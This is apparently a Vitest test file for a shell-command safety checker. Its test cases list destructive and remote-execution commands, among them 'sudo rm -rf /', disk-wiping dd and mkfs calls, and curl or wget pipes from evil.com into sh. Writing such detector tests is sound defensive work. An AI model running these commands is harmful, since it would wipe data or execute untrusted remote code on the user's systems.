import { describe, expect, it } from "vitest";
import { isDangerousCommand } from "./dangerousCommands";

/**
 * 危險指令檢測測試
 *
 * 測試 isDangerousCommand 函數能正確識別危險指令
 */
describe("isDangerousCommand", () => {
  describe("應該識別為危險指令", () => {
    it("遞迴刪除指令", () => {
      expect(isDangerousCommand("rm -rf /home/user")).toBe(true);
      expect(isDangerousCommand("rm -r /tmp/important")).toBe(true);
      expect(isDangerousCommand("rm -rf .")).toBe(true);
    });

    it("提權指令", () => {
      expect(isDangerousCommand("sudo apt install something")).toBe(true);
      expect(isDangerousCommand("sudo rm -rf /")).toBe(true);
      expect(isDangerousCommand("sudo ls")).toBe(true);
    });

    it("危險權限設定", () => {
      expect(isDangerousCommand("chmod 777 /etc")).toBe(true);
      expect(isDangerousCommand("chmod -R 777 /var")).toBe(true);
    });

    it("Shell 執行指令", () => {
      expect(isDangerousCommand("eval dangerous_code")).toBe(true);
      expect(isDangerousCommand("exec bash")).toBe(true);
    });

    it("系統格式化指令", () => {
      expect(isDangerousCommand("mkfs /dev/sda1")).toBe(true);
      expect(isDangerousCommand("mkfs.ext4 /dev/sdb")).toBe(true);
      expect(isDangerousCommand("dd if=/dev/zero of=/dev/sda")).toBe(true);
      expect(isDangerousCommand("fdisk /dev/sda")).toBe(true);
      expect(isDangerousCommand("format C:")).toBe(true);
    });

    it("下載並執行指令", () => {
      expect(isDangerousCommand("curl http://evil.com/script.sh | sh")).toBe(
        true,
      );
      expect(isDangerousCommand("curl http://evil.com/script.sh | bash")).toBe(
        true,
      );
      expect(isDangerousCommand("wget http://evil.com/script.sh | sh")).toBe(
        true,
      );
      expect(isDangerousCommand("wget http://evil.com/script.sh | bash")).toBe(
        true,
      );
    });
  });

  describe("應該識別為安全指令", () => {
    it("一般檔案操作", () => {
      expect(isDangerousCommand("ls -la")).toBe(false);
      expect(isDangerousCommand("pwd")).toBe(false);
      expect(isDangerousCommand("cat file.txt")).toBe(false);
      expect(isDangerousCommand("mkdir new_folder")).toBe(false);
    });

    it("Git 指令", () => {
      expect(isDangerousCommand("git status")).toBe(false);
      expect(isDangerousCommand("git log")).toBe(false);
      expect(isDangerousCommand("git diff")).toBe(false);
      expect(isDangerousCommand("git add .")).toBe(false);
    });

    it("開發工具指令", () => {
      expect(isDangerousCommand("npm test")).toBe(false);
      expect(isDangerousCommand("npm run build")).toBe(false);
      expect(isDangerousCommand("pnpm install")).toBe(false);
      expect(isDangerousCommand("node index.js")).toBe(false);
    });

    it("安全的 rm 指令（非遞迴）", () => {
      expect(isDangerousCommand("rm file.txt")).toBe(false);
      expect(isDangerousCommand("rm -f file.txt")).toBe(false);
    });

    it("安全的 chmod 指令", () => {
      expect(isDangerousCommand("chmod 644 file.txt")).toBe(false);
      expect(isDangerousCommand("chmod +x script.sh")).toBe(false);
    });
  });

  describe("邊界情況", () => {
    it("空字串應該是安全的", () => {
      expect(isDangerousCommand("")).toBe(false);
    });

    it("只有空白的字串應該是安全的", () => {
      expect(isDangerousCommand("   ")).toBe(false);
    });

    it("大小寫不敏感", () => {
      expect(isDangerousCommand("RM -RF /")).toBe(true);
      expect(isDangerousCommand("SUDO apt install")).toBe(true);
      expect(isDangerousCommand("Eval code")).toBe(true);
    });
  });
});
